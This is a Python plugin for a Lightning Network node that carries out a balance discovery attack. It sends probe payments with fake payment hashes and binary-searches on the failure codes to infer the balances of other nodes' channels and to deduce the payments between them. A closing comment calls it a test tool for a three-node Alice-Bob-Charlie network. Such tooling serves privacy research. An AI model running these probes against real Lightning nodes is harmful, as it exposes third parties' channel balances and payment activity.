#!/usr/bin/env python3
from pyln.client import Plugin, Millisatoshi, RpcError
import os
from collections import namedtuple
from functools import reduce
import secrets
import hashlib


plugin = Plugin()
plugin.our_node_id = None
plugin.node_names = {}
plugin.balances = [None, None, None, None]
plugin.changes = [0, 0, 0, 0]
plugin.channels = {}

currdir = os.path.dirname(__file__)
plugin_path = os.path.join(currdir, 'bda.py')

def check_dependencies():
    # Check whether getfixedroute.py plugin runs. This function is called once
    # during init. If getfixedroute.py is stopped after initialization of this
    # plugin it will most likely result in akward behavior.
    plugins = [os.path.basename(p['name']) for p in plugin.rpc.plugin_list()['plugins']]
    if not "getfixedroute.py" in plugins:
        # plugin.log("dpchannels.py depends on plugin getfixedroute.py. dpchannels.py stopped")
        plugin.rpc.plugin_stop(plugin_path)


@plugin.init()
def init(options, configuration, plugin: Plugin):
    # plugin.log("Plugin dba.py initialized")
    # This plugin depends on the getfixedroute.py plugin, So check if that plugin is active.
    check_dependencies()

    plugin.our_node_id = plugin.rpc.getinfo()["id"]

@plugin.method("bda")
def bda(src, dest):
    return balance_attack(src, dest)


@plugin.method("fullbda")
def fullbda(plugin):
    payload = {
        "command" : "fullbda"
    }
    # plugin.log("Start fullbda")
    init_names(payload)
    # plugin.log("Names: {}".format(plugin.node_names))
    ABleft, ABright = balance_attack(plugin.node_names["Alice"], plugin.node_names["Bob"])
    BCleft, BCright = balance_attack(plugin.node_names["Bob"], plugin.node_names["Charlie"])
    new_balances = [ABleft, ABright, BCleft, BCright]
    for x in range(0, 4):
        if plugin.balances[x] is not None:
            plugin.changes[x] = int(new_balances[x]) - int(plugin.balances[x])
        plugin.balances[x] = new_balances[x]
    # plugin.log("Full BDA successful, balances: {}, changes: {}".format(plugin.balances, plugin.changes))
    return True

def init_names(payload):
    if len(plugin.node_names) == 0:
        channels = list(filter(lambda c: c["source"] != plugin.our_node_id and c["destination"] != plugin.our_node_id, plugin.rpc.listchannels()["channels"]))
        plugin.channels = channels
        nodes = list(filter(lambda n: n["nodeid"] !=  plugin.our_node_id, plugin.rpc.listnodes()["nodes"]))
        if len(channels) != 4 and len(nodes) != 3:
            raise RpcError(payload['command'], payload, {'message': 'BDA can only parse networks with 2 channels and nodes'})
        # One of the nodes has a channel with both other nodes, this is the middle one. We will call it Bob.
        for node in nodes:
            plugin.node_names[node["alias"].capitalize()] = node["nodeid"]

@plugin.method("shownetwork")
def shownetwork(plugin):
    """Show network with or without our node
    """
    payload = {
        "command" : "shownetwork"
    }
    init_names(payload)
    reply = {}
    reply["format-hint"] = "simple"
    reply["network"] = drawnetwork(capacities=[getcapacity(plugin.node_names["Alice"], plugin.node_names["Bob"], plugin.channels), getcapacity(plugin.node_names["Bob"], plugin.node_names["Charlie"], plugin.channels)], balances=plugin.balances, changes=plugin.changes)
    return reply
    
def getcapacity(src, dest, channels):
    channel = getchannel(src, dest, channels)
    return Millisatoshi(channel["satoshis"] * 1000)

def getchannel(src, dest, channels):
    return next(filter(lambda c: c["source"] == src and c["destination"] == dest, channels))

def drawnetwork(names = ["Alice", "Bob", "Charlie"], capacities = [Millisatoshi(0), Millisatoshi(0)] , balances = [None, None, None, None], changes= [0,0,0,0]):
    Charset = namedtuple('Charset', ['top_l', 'bot_l', 'top_r', 'bot_r', 'hor', 'ver', 'con_l', 'con_r'])
    draw = Charset('┌', '└', '┐', '┘', '─', '│', '├', '┤')
    changes_str = list(map(lambda b: "+" + str(b) if b > 0 else str(b), changes))
    balances_str = list(map(lambda b: str(int(b)) if b is not None else "?", balances))
    boxlength = reduce(lambda a, b:  a if a > b else b, map(lambda a: len(a), names)) + 4
    linelength =max(len(str(int(capacities[0]))), len(str(int(capacities[1])))) * 2 + 4
    pos1 = round(boxlength + linelength/2 - (len(str(capacities[0]))/2))+1
    pos2 = round(2*boxlength + linelength * 1.5 - (len(str(capacities[1]))/2))
    line1 = " "*(pos1-1) + str(capacities[0]) + " "*(pos2 - pos1 - len(str(capacities[0])) + 1)  + str(capacities[1]) + "\n"
    line2 = draw.top_l + draw.hor*(boxlength-2) + draw.top_r
    line2 += " "*linelength + draw.top_l + draw.hor*(boxlength-2) + draw.top_r
    line2 += " "*linelength + draw.top_l + draw.hor*(boxlength-2) + draw.top_r + "\n"
    line3 = draw.ver + " "*((boxlength-len(names[0])-2)//2) + names[0] + " "*((boxlength-len(names[0])-2)//2 + (boxlength-len(names[0])) % 2) + draw.con_l 
    line3 += draw.hor*(max(len(changes_str[0])-len(balances_str[0]), 0)+1) + balances_str[0] + draw.hor*(linelength - 2 -max(len(balances_str[0]),len(changes_str[0]))-len(balances_str[1])) + balances_str[1] + draw.hor
    line3 += draw.con_r + " "*((boxlength-len(names[1])-2)//2) + names[1] + " "*((boxlength-len(names[1])-2)//2 + (boxlength-len(names[1])) % 2)  + draw.con_l
    line3 += draw.hor*(max(len(changes_str[2])-len(balances_str[2]), 0)+1) + balances_str[2] + draw.hor*(linelength - 2 -max(len(balances_str[2]),len(changes_str[2]))-len(balances_str[3])) + balances_str[3] + draw.hor
    line3 += draw.con_r + " "*((boxlength-len(names[2])-2)//2) + names[2] + " "*((boxlength-len(names[2])-2)//2 + (boxlength-len(names[2])) % 2) + draw.ver + "\n"
    line4 = draw.bot_l + draw.hor*(boxlength-2) + draw.bot_r
    if changes[0] != 0:
        line4 += " "*(max(len(balances_str[0])-len(changes_str[0]), 0)+1) + changes_str[0] + " "*(linelength - max(len(balances_str[0])-len(changes_str[0]), 0) - len(changes_str[0]) - len(changes_str[1])-2) + changes_str[1] + " "
    else:
        line4 += " "*linelength
    line4 += draw.bot_l + draw.hor*(boxlength-2) + draw.bot_r
    if changes[2] != 0:
        line4 += " "*(max(len(balances_str[2])-len(changes_str[2]), 0)+1) + changes_str[2] + " "*(linelength - max(len(balances_str[2])-len(changes_str[2]), 0) - len(changes_str[2]) - len(changes_str[3])-2) + changes_str[3] + " "
    else:
        line4 += " "*linelength
    line4 += draw.bot_l + draw.hor*(boxlength-2) + draw.bot_r + "\n"

    line5  = ""
    if changes[1] > 0 and changes[3] > 0:
        line5= "Alice paid Charlie {}msat\n".format(changes[3])
    elif changes[1] > 0:
        line5= "Alice paid Bob {}msat\n".format(changes[1])
    elif changes[3] > 0:
        line5= "Bob paid Charlie {}msat\n".format(changes[3])
    
    if changes[2] > 0 and changes[0] > 0:
        line5= "Charlie paid Alice {}msat\n".format(changes[0])
    elif changes[2] > 0:
        line5= "Charlie paid Bob {}msat\n".format(changes[2])
    elif changes[0] > 0:
        line5= "Bob paid Alice {}msat\n".format(changes[0])
    return "\n" + line1 + line2 + line3 + line4 + line5

def balance_attack(src, dest):
    channels = list(filter(lambda c: c["source"] != plugin.our_node_id and c["destination"] != plugin.our_node_id, plugin.rpc.listchannels()["channels"]))
    channel = getchannel(src, dest, channels)
    capacity = Millisatoshi(channel["satoshis"] * 1000)
    keepGoing = True
    min = Millisatoshi(0)
    max = capacity
    accuracy_threshold = Millisatoshi(1)
    while keepGoing:
        amt = (max + min) // 2
        payment_key = secrets.token_bytes(32)
        payment_hash = hashlib.sha256(payment_key).hexdigest()
        try:
            route = plugin.rpc.getfixedroute([plugin.our_node_id, channel["source"], channel["destination"],] , int(amt))["route"]
            plugin.rpc.sendpay(route, payment_hash, msatoshi=amt)
            plugin.log("WaitSendPay: {}".format(plugin.rpc.waitsendpay(payment_hash, 10)))
        except RpcError as e:
            error = e.error['data']
            plugin.log('Error received during bda: {}'.format(error))
            if error["failcodename"] == "WIRE_INCORRECT_OR_UNKNOWN_PAYMENT_DETAILS":
                if min < amt:
                    min = amt
            # if error["failcodename"] == "WIRE_TEMPORARY_CHANNEL_FAILURE":
            else:
                if max > amt:
                    max = amt
        if (max - min <= accuracy_threshold):
            keepGoing = False
    
    left = (capacity * 0.01) + min
    right = capacity - left
    return left, right

plugin.run()
# A full BDA tries to mount a BDA to all channels (that the adversary is not part of)
# This plugin is only for test purposes and assumes a few things about the network:
# 1. It has a direct channel with *all* other nodes
# 2. Two way probing is not necessary, so all public channels have a capacity < max_allowed_payment
# 3. It mounts an attack from the side with the lexicographically lesser id
# 4. It remembers the last attack to deduce payments
# 5. it shows the network
# 6. The network is Alice Bob and Charlie connected in a line.
